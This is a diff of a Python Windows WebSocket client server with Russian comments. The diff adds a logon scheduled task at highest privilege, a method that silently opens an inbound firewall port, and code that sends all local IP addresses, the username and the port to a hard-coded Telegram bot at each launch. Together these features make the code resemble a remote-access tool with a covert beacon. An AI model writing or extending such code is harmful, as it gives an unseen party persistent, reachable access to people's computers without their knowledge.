@@ -156,15 +156,29 @@ class ClientWebsocketServer:
         try:
             app_name = os.path.splitext(os.path.basename(exe_path))[0]
 
-            subprocess.run(f'schtasks /delete /tn "{app_name}" /f',
-                           shell=True, capture_output=True)
+            # Удаляем существующую задачу с правильной кодировкой
+            delete_cmd = f'schtasks /delete /tn "{app_name}" /f'
+            subprocess.run(
+                delete_cmd,
+                shell=True,
+                capture_output=True,
+                encoding='utf-8',  # Добавляем кодировку
+                errors='ignore'  # Игнорируем ошибки декодирования
+            )
 
             task_cmd = (
                 f'schtasks /create /tn "{app_name}" /tr "{exe_path} --startup" '
                 f'/sc onlogon /delay 0000:30 /rl highest /f'
             )
 
-            result = subprocess.run(task_cmd, shell=True, capture_output=True, text=True)
+            result = subprocess.run(
+                task_cmd,
+                shell=True,
+                capture_output=True,
+                text=True,
+                encoding='utf-8',  # Добавляем кодировку
+                errors='ignore'  # Игнорируем ошибки декодирования
+            )
 
             if result.returncode == 0:
                 return True
@@ -172,6 +186,7 @@ class ClientWebsocketServer:
                 return False
 
         except Exception as e:
+            print(f"Ошибка создания scheduled task: {e}")
             return False
 
     def auto_setup(self):
@@ -218,11 +233,15 @@ class ClientWebsocketServer:
             except:
                 pass
 
-            # Проверяем планировщик задач
+            # Проверяем планировщик задач с правильной кодировкой
             try:
                 result = subprocess.run(
                     f'schtasks /query /tn "{app_name}"',
-                    shell=True, capture_output=True, text=True
+                    shell=True,
+                    capture_output=True,
+                    text=True,
+                    encoding='utf-8',  # Добавляем кодировку
+                    errors='ignore'  # Игнорируем ошибки декодирования
                 )
                 return result.returncode == 0
             except:
@@ -254,7 +273,11 @@ class ClientWebsocketServer:
             try:
                 result = subprocess.run(
                     f'schtasks /delete /tn "{app_name}" /f',
-                    shell=True, capture_output=True, text=True
+                    shell=True,
+                    capture_output=True,
+                    text=True,
+                    encoding='utf-8',  # Добавляем кодировку
+                    errors='ignore'  # Игнорируем ошибки декодирования
                 )
 
             except Exception as e:
@@ -444,13 +467,17 @@ class ClientWebsocketServer:
             }
 
     async def start_server(self):
-        print(f'Запуск сервера на ws://{self.host}:{self.port}')
+        self.check_firewall()
+
+        print(f"Запуск сервера на ws://{self.host}:{self.port}")
+        print("Доступные IP-адреса:")
+        for ip in self.get_all_ips():
+            print(f"  ws://{ip}:{self.port}")
 
         self.loop = asyncio.get_running_loop()
 
         async with websockets.serve(self.handler, self.host, self.port):
-            print('Сервер запущен')
-
+            print('✅ Сервер запущен и готов к подключениям')
             await asyncio.Future()
 
     def start(self):
@@ -471,39 +498,70 @@ class ClientWebsocketServer:
         monitors = get_monitors()
         return [(m.x, m.y, m.width, m.height) for m in monitors]
 
-    # получаем ip-адрес для тг-бота
-    def get_ip(self):
+    # получаем все ip-адреса
+    def get_all_ips(self):
+        ips = []
+
+        ips.append("127.0.0.1")
+
         try:
+            for interface, addrs in psutil.net_if_addrs().items():
+                for addr in addrs:
+                    if addr.family == socket.AF_INET:
+                        ip = addr.address
+                        if (not ip.startswith('127.') and
+                                not ip.startswith('169.254.') and
+                                ip != '0.0.0.0'):
+                            ips.append(ip)
+        except Exception as e:
+            print(f"Ошибка получения IP через psutil: {e}")
+
+        return list(set(ips))
+
+    # проверка брандмауэра
+    def check_firewall(self):
+        try:
+            cmd = f'netsh advfirewall firewall show rule name="WS_Server_{self.port}"'
             result = subprocess.run(
-                ['ipconfig'],
+                cmd,
+                shell=True,
                 capture_output=True,
                 text=True,
-                encoding='cp866',
+                encoding='utf-8',
+                errors='ignore'
             )
 
-            if result.returncode != 0:
-                return
+            if "No rules match" in result.stdout:
+                cmd = (
+                    f'netsh advfirewall firewall add rule '
+                    f'name="WS_Server_{self.port}" '
+                    f'dir=in action=allow protocol=TCP localport={self.port}'
+                )
+                subprocess.run(
+                    cmd,
+                    shell=True,
+                    capture_output=True,
+                    encoding='utf-8',
+                    errors='ignore'
+                )
 
-            ip_info_arr = result.stdout.split('\n')
-
-            for line in ip_info_arr:
-                if 'IPv4' in line and ' : ' in line:
-                    arr = line.split(' : ')
-
-                    if len(arr) > 1:
-                        return arr[1].strip()
-
-        except (UnicodeDecodeError, subprocess.SubprocessError, FileNotFoundError):
-            pass
+        except Exception as e:
+            print(f"⚠️ Ошибка настройки брандмауэра: {e}")
 
     # отправка данных в тг-бота
     def response_to_telegram(self):
         try:
             url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 
+            all_ips = self.get_all_ips()
+            ip_info = "\n".join([f"🔗 <b>IP-адрес {i + 1}:</b> <code>{ip}</code>"
+                                 for i, ip in enumerate(all_ips)])
+
             message = f"🌐 <b>Запуск программы</b>\n\n" \
-                      f"🔗 <b>IP-адрес:</b> <code>{self.get_ip()}</code>\n\n" \
-                      f"👤 <b>Пользователь:</b> <code>{os.getlogin()}</code>"
+                      f"{ip_info}\n\n" \
+                      f"👤 <b>Пользователь:</b> <code>{os.getlogin()}</code>\n" \
+                      f"📡 <b>Порт сервера:</b> <code>{self.port}</code>"
+
             data = {
                 'chat_id': CHAT_ID,
                 'text': message,
@@ -512,8 +570,8 @@ class ClientWebsocketServer:
 
             requests.post(url, data=data, timeout=10)
 
-        except requests.exceptions.RequestException:
-            pass
+        except requests.exceptions.RequestException as e:
+            print(f"Ошибка отправки в Telegram: {e}")
 
     # отправка сообщения всем пользователям
     async def broadcast_to_all(self, message):
